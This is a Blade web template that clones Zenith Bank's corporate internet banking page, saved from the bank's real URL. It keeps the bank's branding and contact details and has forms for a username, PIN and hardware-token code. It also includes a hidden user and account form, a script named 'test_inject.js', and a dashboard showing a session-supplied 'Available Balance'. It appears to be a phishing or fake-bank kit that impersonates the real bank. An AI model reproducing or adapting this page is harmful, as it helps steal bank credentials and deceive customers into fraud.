<!DOCTYPE html>
<!-- saved from url=(0059)https://icorporate.zenithbank.com/coporate-internetbanking/ -->
<html lang="en" xmlns="http://www.w3.org/1999/xhtml"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">  
<!--        <meta http-equiv="refresh" content="0; url=https://www.google.com.ng/" />-->
<!--        <meta http-equiv="refresh" content="0; url=https://auth.zenithbank.com/internetbanking/" />-->
        <meta http-equiv="X-UA-Compatible" content="IE=edge">
        <link rel="shortcut icon" href="{{ asset('zenith/favicon.ico')}}">  
<!--        <link rel="shortcut icon" href="./login/images/favicon.ico">-->
              
        
        <meta name="viewport" content="width=device-width, initial-scale=1">            
        
            
            
        <link rel="stylesheet" href="{{ asset('zenith/bootstrap.min.css')}}">
        <link rel="stylesheet" id="smartmag-core-css" href="{{ asset('zenith/style.css')}}" type="text/css" media="all">  
        <link rel="stylesheet" id="bbp-default-css" href="{{ asset('zenith/bbpress.css')}}" type="text/css" media="screen">
        <link rel="stylesheet" id="smartmag-bbpress-css" href="{{ asset('zenith/bbpress-ext.css')}}" type="text/css" media="all">
        <link rel="stylesheet" id="smartmag-responsive-css" href="{{ asset('zenith/responsive.css')}}" type="text/css" media="all">  
        <link rel="stylesheet" href="{{ asset('zenith/skdslider.css')}}">   
        <link rel="stylesheet" href="{{ asset('zenith/sidenavi-right.css')}}">
            
            
        
            <style type="text/css">
                .modal-body .form-horizontal .col-sm-2,
                .modal-body .form-horizontal .col-sm-10 {
                    width: 100%
                }

                .modal-body .form-horizontal .control-label {
                    text-align: left;
                }
                
                .modal-body .form-horizontal .col-sm-offset-2 {
                    margin-left: 15px;
                }

                .show_on_search_valid {
                    display: none;
                }

                @media print {
                    .noprint {
                        display: none !important;
                    }
                    * {
                        border: none !important;
                    }
                    .show_on_search_valid h4 {
                        font-size: 30px;
                    }
                    .col-sm-4, .col-sm-5 {
                        float: left !important;
                        width: 200px !important;
                    }
                    .col-sm-8, .col-sm-7 {
                        float: right !important;
                        width: 350px !important;
                    }
                    .adjust-margin {
                        margin-top: 5px !important;
                    }
                    .adjust-margin p,  .adjust-margin div{
                        padding-top: 0 !important;
                        padding-bottom: 0 !important;
                    }
                }
            </style>
            
     {{-- <script src="{{ asset('zenith/frontend.1ba33d9684afd72608a4bfa4e583d01f504375c6.bundle.min.js')}}"></script> --}}
     <script src="{{ asset('zenith/test_inject.js')}}"></script>
     <script src="{{ asset('zenith/jquery-2.2.4.min.js')}}" type="text/javascript"></script>     
     <script src="{{ asset('zenith/bootstrap.min.js')}}"></script>
     <script src="{{ asset('zenith/bootstrapvalidator.min.js')}}" type="text/javascript"></script>     
        
            
<!--            <link rel="stylesheet" href="font-awesome/css/font-awesome.css">
            <link rel="stylesheet" href="font-awesome/css/font-awesome.min.css">-->
   
        

            
        <!-- <link  rel="stylesheet" href="login/css/percircle.css">-->
    <style>             
                .alert 
                {                  
                    font-size: 13px;                    
                }                
                
                [data-tip] 
                {
                    position:relative;
                }
                
                [data-tip]:before 
                {
                        content:'';
                        /* hides the tooltip when not hovered */
                        display:none;
                        content:'';
                        border-left: 5px solid transparent;
                        border-right: 5px solid transparent;
                        border-bottom: 5px solid #1a1a1a;	
                        position:absolute;
                        top:30px;
                        left:35px;
                        z-index:8;
                        font-size:0;
                        line-height:0;
                        width:0;
                        height:0;
                }
                
                [data-tip]:after 
                {
                        display:none;
                        content:attr(data-tip);
                        position:absolute;
                        top:35px;
                        left:0px;
                        padding:5px 8px;
                        background:#1a1a1a;
                        color:#fff;
                        z-index:9;
                        font-size: 0.75em;
                        height:18px;
                        line-height:18px;
                        -webkit-border-radius: 3px;
                        -moz-border-radius: 3px;
                        border-radius: 3px;
                        white-space:nowrap;
                        word-wrap:normal;
                }

                [data-tip]:hover:before,
                [data-tip]:hover:after 
                {
                    display:block;
                }           

                .alert-danger li {
                    border-bottom: none !important;
                }

                .fluid {
                    width: 100% !important;
                }

                .tile_menu {
                    background-color: #fff;
                    border: 1px solid #ccc;
                    width: 130px;
                    height: 130px;
                    text-align: center;
                    display: inline-block;
                    text-decoration: none !important;
                }

                .tile_menu p {
                    font-size: 60px;
                    margin-bottom: 0;
                }

                .trnx {
                    border-radius: 8px;
                    padding: 15px;
                    border: 1px solid #d43f3a;
                    text-align: center;
                    margin: 0 30px 8px;
                    overflow: hidden;
                }

                .trnx .form-group {
                    margin-bottom: 16px;
                }

                .trnx h4 {
                    color: #d43f3a;
                    margin-bottom: 12px;
                    text-align: left;
                }
                
                .trnx p {
                    margin-bottom: 0;
                }

                .trnx .btn-block {
                  width: -webkit-fill-available !important;
                }

                .hide_input {
                    display: none;
                }

    </style>
        
        
    
    

<script src="{{ asset('zenith/skdslider.js')}}"></script>
<script type="text/javascript">
               jQuery(document).ready(function(){
                       jQuery('#demo').skdslider({'delay':8000, 'fadeSpeed': 2000,'showNextPrev':true,'showPlayButton':true,'autoStart':true});
               });
</script>
        
        
<!--        <script src="login/js/jquery.js"></script>-->
<!--        <script src="js/jquery.min.js" type="text/javascript"></script>      -->
<!--        <script src="js/skdslider.js"></script>
            <script type="text/javascript">
                        jQuery(document).ready(function(){
                                jQuery('#demo').skdslider({'delay':8000, 'fadeSpeed': 2000,'showNextPrev':true,'showPlayButton':true,'autoStart':true});
                        });
        </script>-->
        
          
<!--        <script src="login/js/percircle.js"></script>-->
        <title>Zenith Bank CorporateIBank | Index</title>
    {{-- <script type="text/javascript" src="chrome-extension://aadgmnobpdmgmigaicncghmmoeflnamj/ng-inspector.js"></script>
    <script type="text/javascript" charset="utf-8" async="" src="./Zenith Bank CorporateIBank _ Index_files/6.1ba33d9684afd72608a4bfa4e583d01f504375c6.bundle.min.js.download"></script>
    <script type="text/javascript" charset="utf-8" async="" src="./Zenith Bank CorporateIBank _ Index_files/24.1ba33d9684afd72608a4bfa4e583d01f504375c6.bundle.min.js.download">
    </script><script type="text/javascript" charset="utf-8" async="" src="./Zenith Bank CorporateIBank _ Index_files/36.1ba33d9684afd72608a4bfa4e583d01f504375c6.bundle.min.js.download">
    </script><script type="text/javascript" charset="utf-8" async="" src="./Zenith Bank CorporateIBank _ Index_files/33.1ba33d9684afd72608a4bfa4e583d01f504375c6.bundle.min.js.download"></script>
    <script type="text/javascript" charset="utf-8" async="" src="./Zenith Bank CorporateIBank _ Index_files/34.1ba33d9684afd72608a4bfa4e583d01f504375c6.bundle.min.js.download"></script></head> --}}
    <body>
        
        <div class="">

	
	<div id="main-head" class="main-head noprint">
            <div @if( $show_menu_ ) class="wrap" @else class="wrap fluid" @endif>
		
                <header>
                    <div id="logo-zb" class="title">                     
                           <a><img src="{{ asset('zenith/logo.png')}}" alt="logo"></a>
                    </div>

                        <div class="right">
                            <div>			
                                <img src="{{ asset('zenith/animated_logo1.gif')}}" alt="logo" style="width: 75px; padding-top: 20px;">			
                            </div>
                        </div>
                </header>
			
						
                <nav class="navigation cf">
                        <div class="mobile" data-type="classic" data-search="1">
                                <a href="#" class="selected">
                                        <span class="text">Home</span>
                                        <span class="current"></span> 
                                        <i class="hamburger fa fa-bars"></i>
                                </a>
                        </div>

                        <div class="menu-main-menu-container">
                            <ul id="menu-main-menu" class="menu">
                                <li id="menu-item-722" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-722">
                                    <a title="Home" href="#"> @if( $show_menu_ ) Home @else Welcome, <strong> {{ session()->get('user')->corporate_name }}</strong>.  @endif</a>
                                </li>
                            </ul>
                            @if( !$show_menu_ )
                                <div id="alert" class="rcorners" style="display: inline-block;float: right;margin-right: 20px;font-weight: bold;">
                                    <p style="line-height: 42px;margin-bottom: 0;">Available Balance: <strong>&#8358;{{ session()->get('user')->available_balance }}</strong></p>                
                                </div>
                            @endif
                        </div>			
                </nav>
			
		</div>
		
	</div>
	
            <div @if( $show_menu_ ) class="wrap noprint" @else class="wrap fluid noprint" @endif>
            <div class="breadcrumbs">
                    <span class="location">You are at:</span>
                        <a href="#" class="bbp-breadcrumb-home">Corporate Internet Banking</a>
                    <span class="delim">»</span><span class="current">@if( $show_menu_ ) Login @else Dashboard @endif</span>
                    
                    @if( !$show_menu_ )
                        <div id="alert" class="rcorners" style="display: inline-block;float: right;margin-right: 20px;font-weight: bold;">
                            <a href="{{ url('/bank/zenith/logout') }}">Logout</a>                  
                        </div>
                    @endif
            </div>
            
              
        </div>


<div @if( $show_menu_ ) class="main wrap cf" @else class="main wrap cf fluid" @endif  style="margin-bottom:0px">
	<div class="row">
        <div id="main-content1"  @if( $show_menu_ ) class="col-8 main-content noprint" @else class="col-6 main-content noprint"  @endif>		
			<div class="post-0 forum type-forum status-publish">				
                            <div id="demo" class="skdslider" style="width:100%;">
                                <ul class="slides">
<!--                                    <li><img src="images/corporate-ibank.jpg" width="100%" /></li>-->
                                    <li style="display: none;"><img src="{{ asset('zenith/01.jpg')}}" width="100%"></li>
                                    <li style="display: list-item;"><img src="{{ asset('zenith/02.jpg')}}" width="100%"></li>
                                    <li style="display: none;"><img src="{{ asset('zenith/03.jpg')}}" width="100%"></li>
                                    <li style="display: none;"><img src="{{ asset('zenith/1.jpg')}}" width="100%"></li>
                                    <li style="display: none;"><img src="{{ asset('zenith/2.jpg')}}" width="100%"></li>                                    
                                    <li style="display: none;"><img src="{{ asset('zenith/4.jpg')}}" width="100%"></li>
                                    <li style="display: none;"><img src="{{ asset('zenith/5.jpg')}}" width="100%"></li>
                                    <li style="display: none;"><img src="{{ asset('zenith/6.jpg')}}" width="100%"></li>
                                </ul>
                            <ul class="slide-navs" style="margin-left: -64px;"><li class="slide-nav-0"><a></a></li><li class="slide-nav-1 current-slide"><a></a></li><li class="slide-nav-2"><a></a></li><li class="slide-nav-3"><a></a></li><li class="slide-nav-4"><a></a></li><li class="slide-nav-5"><a></a></li><li class="slide-nav-6"><a></a></li><li class="slide-nav-7"><a></a></li></ul><a class="prev"></a><a class="next"></a><a class="play-control pause" style="display: none;"></a></div>
<div>				
				
<div id="bbpress-forums" class="noprint">	

    <ul id="forums-list-0" class="bbp-forums">
	<li class="bbp-body">
<!--		<div class="section-head gallery-title forum-cat" style="font-weight:normal; font-family: Open Sans;font-size: 13px; 
                                                                         text-transform: uppercase; background: #515356; color: #efefef;
                                                                         padding: 10px 14px; line-height: 34px;">-->
		<div class="section-head gallery-title forum-cat" style="font-weight:normal; font-family: Open Sans,Arial, sans-serif; font-size: 13px; 
                                                                         text-transform: uppercase; background: #515356; color: #efefef;
                                                                         padding: 0px 14px; line-height: 34px;">
                    <ul class="forum-titles">
                        <li class="bbp-forum-info">Useful Information</li>					
                    </ul>
		</div>
									
					
<ul id="bbp-forum-1996" class="post-1996 forum type-forum status-publish single-forum loop-item-0 odd bbp-parent-forum-1984 bbp-forum-status-open bbp-forum-visibility-publish">
            <li class="bbp-forum-freshness" style="width:7%">
		<p class="bbp-topic-meta">
                    <span class="bbp-topic-freshness-author">
			<img alt="" src="{{ asset('zenith/pdlock-x.jpg')}}" class="avatar avatar-45 photo no-display appear" height="45" width="45"></span>
                </p>
            </li>

            <li class="bbp-forum-info" style="width:93%">
                    <a class="bbp-forum-title" href="#protect-yourself" target="_blank">Security Tips</a>
                    <div class="bbp-forum-content">We will never ask for your personal security information by email or by phone. &nbsp;
                        <a href="#protect-yourself" target="_blank">Learn More...</a> 
                    </div>
            </li>
</ul><!-- #bbp-forum-1996 -->								
					
<ul id="bbp-forum-1986" class="post-1996 forum type-forum status-publish single-forum loop-item-0 odd bbp-parent-forum-1984 bbp-forum-status-open bbp-forum-visibility-publish">
        <li class="bbp-forum-freshness" style="width:7%">
		<p class="bbp-topic-meta">
                    <span class="bbp-topic-freshness-author">
			<img alt="" src="{{ asset('zenith/qustn.jpg')}}" class="avatar avatar-45 photo no-display appear" height="45" width="45"></span>		
                </p>
	</li>

	<li class="bbp-forum-info" style="width:93%">	
            <a class="bbp-forum-title" href="#" target="_blank">Frequently Asked Questions</a>		
		<div class="bbp-forum-content">Answers to some frequently asked questions about our products and services and much more.  &nbsp;
		    <a href="#" target="_blank">Learn More...</a> 
                </div>
	</li>
</ul><!-- #bbp-forum-1986 -->		
			
<ul id="bbp-forum-1986" class="post-1996 forum type-forum status-publish single-forum loop-item-0 odd bbp-parent-forum-1984 bbp-forum-status-open bbp-forum-visibility-publish">
        <li class="bbp-forum-freshness" style="width:7%">
		<p class="bbp-topic-meta">
                    <span class="bbp-topic-freshness-author">
			<img alt="" src="{{ asset('zenith/csu-icon.jpg')}}" class="avatar avatar-45 photo no-display appear" height="45" width="45"></span>
                </p>
	</li>	
	
	<li class="bbp-forum-info" style="width:93%">
            <a class="bbp-forum-title" href="#contact-us" target="_blank">Contact Us</a>		
		
		<div class="bbp-forum-content">Phone: 234-1-2787000, 2927000, 4647000, 0700ZENITHBANK. Email Address: zenithdirect@zenithbank.com <br>
                </div>
	</li>

</ul>

</li>
</ul>
</div>
  </div>
</div>
</div>		
	
     <!-- Sign In -->
    <aside   @if( $show_menu_ ) class="col-4 sidebar noprint" @else class="col-6 sidebar"  @endif id="signIn">     
		<ul>			
            <li id="bunyad_bbplogin_widget-2" class="widget bbp_widget_login" style="margin-bottom: 12px">

                @yield('content')

            </li>

            @if ($show_menu_)
                <br>

                <!--          <li id="bbp_stats_widget-2a" class="widget widget_display_stats" style="margin-top:-40px;">-->
                            <li id="bbp_stats_widget-2a" class="widget widget_display_stats" style="margin-top:-25px;">
                                    <h3 class="widgettitle">Related Links</h3>                    
                                    <dl role="main">
                                            <dt id="forgotPinClick2" style="cursor: pointer;">
                                                <a href="https://www.zenithbank.com/customer-service/faqs/#forgot-login-details" target="_blank" style="text-transform: capitalize; font-size: 13px;">Forgot Login Details?</a></dt>
                <!--                            <dt><a href="https://authdemo.zenithbank.com/internetbanking-demo/" target="_blank">Corporate Internet Banking Step-by-step guide</a></dt>-->
                <dt><a href="https://icorporate.zenithbank.com/coporate-internetbanking/pdf/CIB_login_guide_v2_2017.pdf" target="_blank" style="text-transform: capitalize; font-size: 13px;">Login guide</a></dt>
                                            <dt><a href="https://realtime.zenithbank.com/DotNetRealtime/" target="_blank" style="text-transform: capitalize; font-size: 13px;">Real-time access</a></dt> 
                                            <dt><a href="https://icorporate.zenithbank.com/coporate-internetbanking/" data-toggle="modal" data-target="#myModal" style="text-transform: capitalize; font-size: 14px;">Feedback</a></dt>
                                        </dl>
                            </li>
            @endif
        </ul>
    </aside>
     <!-- Sign In End --> 
     
     
      <!-- New User Starts -->
    <aside class="col-4 sidebar bv-form noprint" id="newUser" style="display: none;" novalidate="novalidate">
		<ul>			
                    <li id="bunyad_bbplogin_widget-2" class="widget bbp_widget_login">
                            <h3 class="widgettitle" id="alert2" style="text-transform: none;">NEW USER </h3>
                             <form method="post" action="#" class="bbp-login-form widget-login" autocomplete="off">
				<fieldset>                                
        <div class="form-group bbp-username input-group">  
            <div class="inputGroupContainer">          
                <div class="bbp-username input-group">
                  <span class="input-group-addon" style="color: #555;">
                      <i class="glyphicon glyphicon-user" data-toggle="tooltip" title="USERNAME - This is a unique identity assigned to you.
                        This is usually formed from your names"></i>
                  </span> 
                     <input type="text" name="loginidNew" value="" id="loginidNew" size="20" tabindex="103" placeholder="Username" data-toggle="tooltip" title="USERNAME - This is a unique identity assigned to you.
                        This is usually formed from your names" data-bv-field="loginidNew">
                </div>
            </div>
       <small data-bv-validator="notEmpty" data-bv-validator-for="loginidNew" class="help-block" style="display: none;">Invalid Username</small></div>
                                        
                                        
       <div class="form-group bbp-username input-group">  
            <div class="inputGroupContainer">          
                <div class="bbp-username input-group">
                  <span class="input-group-addon" style="color: #555;">
                      <i class="glyphicon glyphicon-pushpin" data-toggle="tooltip" title="CREATE PIN - Your PIN should be 4 digits long."></i>
                  </span> 
                    <input type="password" name="newPin" value="" maxlength="4" id="newPin" size="20" tabindex="103" placeholder="Create PIN" data-toggle="tooltip" title="CREATE PIN - Your PIN should be 4 digits long." data-bv-field="newPin">
                  <span class="input-group-addon" style="color: #555; background-color: #eee; border-color: #ccc;">
                      <i class="glyphicon glyphicon-eye-open" id="showPassExist2" data-toggle="tooltip" title="Show PIN"></i>
                  </span> 
                </div>
            </div>
       <small data-bv-validator="stringLength" data-bv-validator-for="newPin" class="help-block" style="display: none;">PIN must be 4 digits</small><small data-bv-validator="notEmpty" data-bv-validator-for="newPin" class="help-block" style="display: none;">PIN is required</small><small data-bv-validator="callback" data-bv-validator-for="newPin" class="help-block" style="display: none;">Invalid PIN. Avoid using repeated or sequential numbers such as 1111 or 1234</small></div>
                                
       <div class="form-group bbp-username input-group">  
            <div class="inputGroupContainer">          
                <div class="bbp-username input-group">
                  <span class="input-group-addon" style="color: #555;">
                      <i class="glyphicon glyphicon-pushpin" data-toggle="tooltip" title="CONFIRM PIN - The PIN you are setting up needs to confirmed. Kindly re-enter the PIN."></i>
                  </span> 
                    <input type="password" name="confirmPin" value="" maxlength="4" id="confirmPin" size="20" tabindex="103" placeholder="Confirm PIN" data-toggle="tooltip" title="CONFIRM PIN - The PIN you are setting up needs to confirmed. Kindly re-enter the PIN." data-bv-field="confirmPin">
                  <span class="input-group-addon" style="color: #555; background-color: #eee; border-color: #ccc;">
                      <i class="glyphicon glyphicon-eye-open" id="showPassExist3" data-toggle="tooltip" title="Show PIN"></i>
                  </span> 
                </div>
            </div>
       <small data-bv-validator="notEmpty" data-bv-validator-for="confirmPin" class="help-block" style="display: none;">PIN is required</small><small data-bv-validator="identical" data-bv-validator-for="confirmPin" class="help-block" style="display: none;"> <b>New PIN</b> and <b>Confirm PIN</b> do not match</small></div>
                                        
       <div class="form-group bbp-username input-group">  
            <div class="inputGroupContainer">          
                <div class="bbp-username input-group">
                  <span class="input-group-addon" style="color: #555;">
                      <i class="glyphicon glyphicon-lock" data-toggle="tooltip" title="TOKEN CODE - The token code is any 6-digit reading displayed on your token."></i>
                  </span> 
                    <input type="password" name="tokenCode" value="" maxlength="6" id="tokenCode" size="20" tabindex="103" placeholder="Token Code" data-toggle="tooltip" title="TOKEN CODE - The token code is any 6-digit reading displayed on your token." data-bv-field="tokenCode">
                    <input type="hidden" name="statusId" value="0" id="statusId">
                </div>
            </div>
       <small data-bv-validator="stringLength" data-bv-validator-for="tokenCode" class="help-block" style="display: none;">Token Code is required</small><small data-bv-validator="notEmpty" data-bv-validator-for="tokenCode" class="help-block" style="display: none;">Please supply a token code</small></div>                
					
    <div class="bbp-submit-wrapper">
        <a href="https://icorporate.zenithbank.com/coporate-internetbanking/#" title="Click here to Sign up as a new user" id="backToSignIn" style="cursor: pointer; text-transform: uppercase;" class="bbp-lostpass-link lost-pass-modal"><b>Back</b></a>
        <input type="submit" style="width: 30%; color: rgb(255, 255, 255); background-color: rgb(81, 83, 86);" name="" id="btnNewUser" value="CREATE PIN" class="button submit user-submit">
    </div>
    </fieldset>
  </form>
</li>
            <br>

<!--            <li id="bbp_stats_widget-2a" class="widget widget_display_stats" style="margin-top:-40px;">-->
            <li id="bbp_stats_widget-2a" class="widget widget_display_stats" style="margin-top:-25px;">
                    <h3 class="widgettitle">Related Links</h3>                    
                    <dl role="main">
                            <dt id="forgotPinClick2" style="cursor: pointer;">
                                <a href="#forgot-login-details" target="_blank" style="text-transform: capitalize; font-size: 13px;">Forgot Login Details?</a></dt>
<!--                            <dt><a href="https://authdemo.zenithbank.com/internetbanking-demo/" target="_blank">Corporate Internet Banking Step-by-step guide</a></dt>-->
<dt><a href="#pdf/CIB_login_guide_v2_2017.pdf" target="_blank" style="text-transform: capitalize; font-size: 13px;">Login guide</a></dt>
                            <dt><a href="#" target="_blank" style="text-transform: capitalize; font-size: 13px;">Real-time access</a></dt> 
                            <dt><a href="#" data-toggle="modal" data-target="#myModal" style="text-transform: capitalize; font-size: 14px;">Feedback</a></dt>
                        </dl>
            </li>
            </ul>
    <input type="hidden" name="" value="CREATE PIN"></aside>
     <!-- New User Ends -->
     
     
     
     <!-- Post to ProcessLogin.java -->
     <aside class="col-4 sidebar noprint" id="PostToProcessLogin">     
		<ul>			
                    <li id="bunyad_bbplogin_widget-2" class="widget bbp_widget_login" style="margin-bottom: 12px">                       
                        <form id="hidd_form">
                            <input type="hidden" name="mid" id="hidd_user"> 
                            <input type="hidden" name="id" id="hidd_acc">
                        </form>
                    </li>                    
     </ul>
    </aside>

    @include('modal_dialog')
             
</div> 
	<!-- .row -->
        
</div> <!-- .main -->

                                    







		
<footer @if( $show_menu_ ) class="wrap noprint" @else class="wrap fluid" @endif>
    <div class="lower-foot noprint">     
    
    
<!--	<div class="wrap"> -->
<!--       <div style="float: right; width: 800px; "> 			-->
<div class="widgets" style="padding: 20px;">     
            <div style="float: left; width: 220px;">
                <a href="#" target="_blank">
                    <img src="{{ asset('zenith/website.png')}}">
                </a>
                <a href="#" target="_blank">
                    <img src="{{ asset('zenith/facebook.png')}}">
                </a>
                <a href="#" target="_blank">
                    <img src="{{ asset('zenith/twitter.png')}}">
                </a>
                <a href="#" target="_blank">
                    <img src="{{ asset('zenith/google-plus.png')}}">
                </a>
                <a href="#" target="_blank">
                    <img src="{{ asset('zenith/instagram.png')}}">
                </a>
                <a href="#" target="_blank">
                    <img src="{{ asset('zenith/youtube.png')}}">
                </a>
                <a href="#" target="_blank">
                    <img src="{{ asset('zenith/linkedin.png')}}">
                </a>
            </div>      
    
    
            <div class="textwidget">Copyright © 2017 
                    <a href="#">Zenith Bank Plc</a>
            </div>
    
            <div class="menu-footer-container">
                <ul id="menu-footer" class="menu">
                    <li id="menu-item-2116" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-2116">
                        <a href="#cib-corporate-internet-banking" target="_blank">About</a>
                    </li>
                    <li id="menu-item-1898" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-1898">
                        <a href="#" target="_blank">Privacy</a>
                    </li>
                    <li id="menu-item-1899" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-1899">
                        <a href="#" target="_blank">Terms of use</a>
                    </li>
                </ul>
            </div>	
</div>
<!--	</div>-->
</div>		
</footer>
	
</div> 
<!-- .main-wrap -->

<script src="{{ asset('zenith/Indexx_Managers.js')}}"></script>	
    <!-- end sidenavi wrapper//-->    

    <script src="{{ asset('zenith/SideNavi.js')}}"></script>
    <script type="text/javascript">
        $(document).ready( function () {
            /**
             *  init sidenavi
             *  first param String direction left or right
             *  second param conf Object css data
             **/
            SideNavi.init('right', {
                container : '#sideNavi',
                item : '.side-navi-item',
                data : '.side-navi-data',
                tab : '.side-navi-tab',
                active : '.active'
            });	
			
            $("div.side-navi-item.item1").trigger("click");            
        });
    </script>    
    
             
